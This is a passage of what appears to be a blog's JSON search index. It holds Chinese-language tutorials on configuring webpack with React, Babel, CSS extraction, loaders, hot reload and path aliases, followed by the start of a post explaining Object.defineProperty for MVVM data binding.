class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;scripts&quot;: &#123;</span><br><span class=\"line\">    &quot;dev&quot;: &quot;webpack --mode development --module-bind js=babel-loader&quot;,</span><br><span class=\"line\">    &quot;build&quot;: &quot;webpack --mode production --module-bind js=babel-loader&quot;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置react\"><a href=\"#配置react\" class=\"headerlink\" title=\"配置react\"></a>配置react</h2><blockquote>\n<p>安装react</p>\n</blockquote>\n<p><code>npm i react react-dom --save-dev</code></p>\n<blockquote>\n<p>安装babel预处理</p>\n</blockquote>\n<p><code>npm i babel-preset-react --save-dev</code></p>\n<blockquote>\n<p>配置<strong>.babelrc</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;presets&quot;: [&quot;env&quot;, &quot;react&quot;]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>配置webpack.json</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  module: &#123;</span><br><span class=\"line\">    rules: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: /\\.(js|jsx)$/,</span><br><span class=\"line\">        exclude: /node_modules/,</span><br><span class=\"line\">        use: &#123;</span><br><span class=\"line\">          loader: &quot;babel-loader&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>案例</p>\n</blockquote>\n<p>1.新建React component在./src/App.js</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import React from &quot;react&quot;;</span><br><span class=\"line\">import ReactDOM from &quot;react-dom&quot;;</span><br><span class=\"line\">const App = () =&gt; &#123;</span><br><span class=\"line\">  return (</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">      &lt;p&gt;React here!&lt;/p&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">export default App;</span><br><span class=\"line\">ReactDOM.render(&lt;App /&gt;, document.getElementById(&quot;app&quot;));</span><br></pre></td></tr></table></figure>\n<p>2.导入react组件，在./src/index.js中<br><code>import App from &quot;./App&quot;;</code><br>3.构建<br><code>npm run build</code><br>4.新建html，引入压缩代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">    &lt;script src=&quot;./dist/main.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"HTML-plugin\"><a href=\"#HTML-plugin\" class=\"headerlink\" title=\"HTML plugin\"></a>HTML plugin</h2><blockquote>\n<p>安装依赖</p>\n</blockquote>\n<p><code>npm i html-webpack-plugin html-loader --save-dev</code></p>\n<blockquote>\n<p>配置webpack.config.js</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const HtmlWebPackPlugin = require(&quot;html-webpack-plugin&quot;);</span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  module: &#123;</span><br><span class=\"line\">    rules: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: /\\.(js|jsx)$/,</span><br><span class=\"line\">        exclude: /node_modules/,</span><br><span class=\"line\">        use: &#123;</span><br><span class=\"line\">          loader: &quot;babel-loader&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: /\\.html$/,</span><br><span class=\"line\">        use: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            loader: &quot;html-loader&quot;,</span><br><span class=\"line\">            options: &#123; minimize: true &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  plugins: [</span><br><span class=\"line\">    new HtmlWebPackPlugin(&#123;</span><br><span class=\"line\">      template: &quot;./src/index.html&quot;,</span><br><span class=\"line\">      filename: &quot;./index.html&quot;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"提取css\"><a href=\"#提取css\" class=\"headerlink\" title=\"提取css\"></a>提取css</h2><blockquote>\n<p>安装依赖</p>\n</blockquote>\n<p><code>npm i mini-css-extract-plugin css-loader --save-dev</code></p>\n<blockquote>\n<p>新建css文件</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* CREATE THIS FILE IN ./src/main.css */</span><br><span class=\"line\">body &#123;</span><br><span class=\"line\">    line-height: 2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>配置webpack.config.js和plugin</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const HtmlWebPackPlugin = require(&quot;html-webpack-plugin&quot;);</span><br><span class=\"line\">const MiniCssExtractPlugin = require(&quot;mini-css-extract-plugin&quot;);</span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  module: &#123;</span><br><span class=\"line\">    rules: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: /\\.(js|jsx)$/,</span><br><span class=\"line\">        exclude: /node_modules/,</span><br><span class=\"line\">        use: &#123;</span><br><span class=\"line\">          loader: &quot;babel-loader&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: /\\.html$/,</span><br><span class=\"line\">        use: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            loader: &quot;html-loader&quot;,</span><br><span class=\"line\">            options: &#123; minimize: true &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: /\\.css$/,</span><br><span class=\"line\">        use: [MiniCssExtractPlugin.loader, &quot;css-loader&quot;]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  plugins: [</span><br><span class=\"line\">    new HtmlWebPackPlugin(&#123;</span><br><span class=\"line\">      template: &quot;./src/index.html&quot;,</span><br><span class=\"line\">      filename: &quot;./index.html&quot;</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">    new MiniCssExtractPlugin(&#123;</span><br><span class=\"line\">      filename: &quot;[name].css&quot;,</span><br><span class=\"line\">      chunkFilename: &quot;[id].css&quot;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>导入css</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// PATH OF THIS FILE: ./src/index.js</span><br><span class=\"line\">import style from &quot;./main.css&quot;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"热更新\"><a href=\"#热更新\" class=\"headerlink\" title=\"热更新\"></a>热更新</h2><blockquote>\n<p>概念</p>\n</blockquote>\n<p>在项目开发过程中，修改代码后，需要手动刷新项目十分不便。通过配置热更新达到自动更新项目的目的并且启动项目自动打开浏览器，修改代码后会产生局部更新，项目会自动重新构建</p>\n<blockquote>\n<p>安装依赖</p>\n</blockquote>\n<p><code>npm i webpack-dev-server --save-dev</code></p>\n<blockquote>\n<p>修改webpack.config.js配置</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;scripts&quot;: &#123;</span><br><span class=\"line\">  &quot;start&quot;: &quot;webpack-dev-server --mode development --open&quot;,</span><br><span class=\"line\">  &quot;build&quot;: &quot;webpack --mode production&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"webpack-demos\"><a href=\"#webpack-demos\" class=\"headerlink\" title=\"webpack demos\"></a>webpack demos</h1><h2 id=\"起步\"><a href=\"#起步\" class=\"headerlink\" title=\"起步\"></a>起步</h2><blockquote>\n<p>基础依赖</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -g webpack webpack-dev-server</span><br><span class=\"line\">npm i webpack-dev-server --save-dev // 热更新</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>常用webpack命令行</p>\n</blockquote>\n<ul>\n<li>webpack – building for development</li>\n<li>webpack -p – building for production (minification)</li>\n<li>webpack –watch – for continuous incremental building</li>\n<li>webpack -d – including source maps</li>\n<li>webpack –colors – making building output pretty</li>\n</ul>\n<blockquote>\n<p>配置快速启动</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// package.json</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  // ...</span><br><span class=\"line\">  &quot;scripts&quot;: &#123;</span><br><span class=\"line\">    &quot;dev&quot;: &quot;webpack --mode development&quot;,</span><br><span class=\"line\">    &quot;build&quot;: &quot;webpack --mode production&quot;,</span><br><span class=\"line\">    &quot;start&quot;: &quot;webpack-dev-server --mode development --open&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"单入口\"><a href=\"#单入口\" class=\"headerlink\" title=\"单入口\"></a>单入口</h2><p>demo01配置</p>\n<blockquote>\n<p>webpack.config</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// webpack.config.js</span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  entry: &apos;./main.js&apos;,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    filename: &apos;bundle.js&apos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>mian.js入口文件</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// main.js</span><br><span class=\"line\">document.write(&apos;&lt;h1&gt;Hello World&lt;/h1&gt;&apos;);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>index.html,引用bundle</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">    &lt;script type=&quot;text/javascript&quot; src=&quot;bundle.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"多入口\"><a href=\"#多入口\" class=\"headerlink\" title=\"多入口\"></a>多入口</h2><p>demo02配置</p>\n<blockquote>\n<p>webpack.config</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  entry: &#123;</span><br><span class=\"line\">    bundle1: &apos;./main1.js&apos;,</span><br><span class=\"line\">    bundle2: &apos;./main2.js&apos;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    filename: &apos;[name].js&apos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>mian.js入口文件</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// main1.js</span><br><span class=\"line\">document.write(&apos;&lt;h1&gt;Hello World&lt;/h1&gt;&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">// main2.js</span><br><span class=\"line\">document.write(&apos;&lt;h2&gt;Hello Webpack&lt;/h2&gt;&apos;);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>index.html,引用bundle</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">    &lt;script src=&quot;bundle1.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">    &lt;script src=&quot;bundle2.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"css-loader\"><a href=\"#css-loader\" class=\"headerlink\" title=\"css loader\"></a>css loader</h2><blockquote>\n<p>scss依赖</p>\n</blockquote>\n<p><code>npm install sass-loader node-sass webpack --save-dev</code><br><code>npm install style-loader css-loader --save-dev</code></p>\n<blockquote>\n<p>配置package.config.js</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">    entry: &apos;./main.js&apos;,</span><br><span class=\"line\">    output: &#123;</span><br><span class=\"line\">        filename: &apos;bundle.js&apos;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    module: &#123;</span><br><span class=\"line\">        rules: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                test: /\\.css$/,</span><br><span class=\"line\">                use: [ &apos;style-loader&apos;, &apos;css-loader&apos; ]</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                test: /\\.scss$/,</span><br><span class=\"line\">                use: [&#123;</span><br><span class=\"line\">                    loader: &quot;style-loader&quot; // creates style nodes from JS strings</span><br><span class=\"line\">                &#125;, &#123;</span><br><span class=\"line\">                    loader: &quot;css-loader&quot; // translates CSS into CommonJS</span><br><span class=\"line\">                &#125;, &#123;</span><br><span class=\"line\">                    loader: &quot;sass-loader&quot; // compiles Sass to CSS</span><br><span class=\"line\">                &#125;]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ],</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"image-loader\"><a href=\"#image-loader\" class=\"headerlink\" title=\"image loader\"></a>image loader</h2><blockquote>\n<p>安装依赖</p>\n</blockquote>\n<p><code>npm install --save-dev url-loader file-loader</code></p>\n<blockquote>\n<p>配置webpack.config</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  entry: &apos;./main.js&apos;,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    filename: &apos;bundle.js&apos;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  module: &#123;</span><br><span class=\"line\">    rules:[</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: /\\.(png|jpg)$/,</span><br><span class=\"line\">        use: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            loader: &apos;url-loader&apos;,</span><br><span class=\"line\">            options: &#123;</span><br><span class=\"line\">              limit: 8192</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"设置别名\"><a href=\"#设置别名\" class=\"headerlink\" title=\"设置别名\"></a>设置别名</h2><blockquote>\n<p>webpack.config.js</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">    resolve: &#123;</span><br><span class=\"line\">             extensions: [‘.js‘, ‘.vue‘],</span><br><span class=\"line\">             alias: &#123;</span><br><span class=\"line\">                 ‘@‘: path.resolve(__dirname, ‘src‘),</span><br><span class=\"line\">                 ‘@scss‘: path.resolve(__dirname, ‘src‘, ‘scss‘),</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>配置了resolve.alias 后，在js中我们可以这样用</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 原本这样写</span><br><span class=\"line\">import hongAlert from ‘./../src/scss/icon.scss‘</span><br><span class=\"line\"></span><br><span class=\"line\">// 现在可以这样写</span><br><span class=\"line\">import hongAlert from ‘@scss/icon.scss‘</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在scss中需要这样写，注意是~@</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 原本这样写</span><br><span class=\"line\">@import ‘./../../../scss/mixin.scss‘;</span><br><span class=\"line\"></span><br><span class=\"line\">// 现在可以这样写，注意是~@</span><br><span class=\"line\">@import ‘~@scss/icon.scss‘;</span><br></pre></td></tr></table></figure>\n","categories":["tool"],"tags":["tool"]},{"title":"深入MVVM","url":"http://zhoushaw.github.io/2018/03/17/learning/font-end/vue/MVVM/","content":"<p>MVVM框架大行其道，这么炫酷的视图渲染模式。骚年有没有兴趣一起了解一波，那就让我们一起开始吧_(:з」∠)</p>\n<div><a id=\"more\"></a></div>\n\n<h2 id=\"Object-defineProperty\"><a href=\"#Object-defineProperty\" class=\"headerlink\" title=\"Object.defineProperty\"></a>Object.defineProperty</h2><blockquote>\n<p>在了解双向绑定原理之前我们先了解一个重要的属性Object.defineProperty</p>\n</blockquote>\n<p>该方法可以用于定义数据可修改性、可否遍历，已经设定属性读取时触发对应的函数</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj,<span class=\"string\">'a'</span>,&#123;</span><br><span class=\"line\">    get: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 该函数在访问该属性时，被调用</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'获取到这个值啦，哈哈哈'</span>;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    set: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">newValue</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'你要赋新的值给我啊，哈哈.并且这个值是'</span>,newValue)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    enumerable: <span class=\"literal\">false</span>,<span class=\"comment\">// 设置为false之后该属性不可以被遍历读取</span></span><br><span class=\"line\">    configurable: <span class=\"literal\">false</span>,<span class=\"comment\">//设置configurable为false之后，该属性不可以再使用defineProperty重新对该属性定义</span></span><br><span class=\"line\">    <span class=\"comment\">// writable: true,// 设置writeable之后，设置的属性不可以改写</span></span><br><span class=\"line\">    <span class=\"comment\">// value: 'hello world'</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 不能 同时设置访问器 (get 和 set) 和 wriable 或 value</span></span><br><span class=\"line\"><span class=\"comment\">// 默认该三个属性都为false</span></span><br><span class=\"line\">obj.a = <span class=\"string\">'hello'</span>;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>get函数</p>\n</blockquote>\n<p>该函数在属性被访问时触发，返回值是获取到的值</p>\n<p>例:<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    a: <span class=\"string\">'hello world'</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj,<span class=\"string\">'a'</span>,&#123;</span><br><span class=\"line\">    get: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'你想要获取obj的a属性值是吗'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj.a);<span class=\"comment\">// 输出你想要获取obj的a属性值是吗</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>setter函数</p>\n</blockquote>\n<p>该函数在属性被写入时触发<br>例:<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    a: <span class=\"string\">'hello world'</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj,<span class=\"string\">'a'</span>,&#123;</span><br><span class=\"line\">    set: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'你在给a属性设置新值'</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">obj.a = <span class=\"string\">'good byes world'</span><span class=\"comment\">// 你在给a属性设置新值</span></span><br></pre></td></tr></table></figure></p>\n<p>enumerable: false,// 设置为false之后该属性不可以被遍历读取<br>configurable: false,//设置configurable为false之后，该属性不可以再使用defineProperty重新对该属性定义<br>writable: true,// 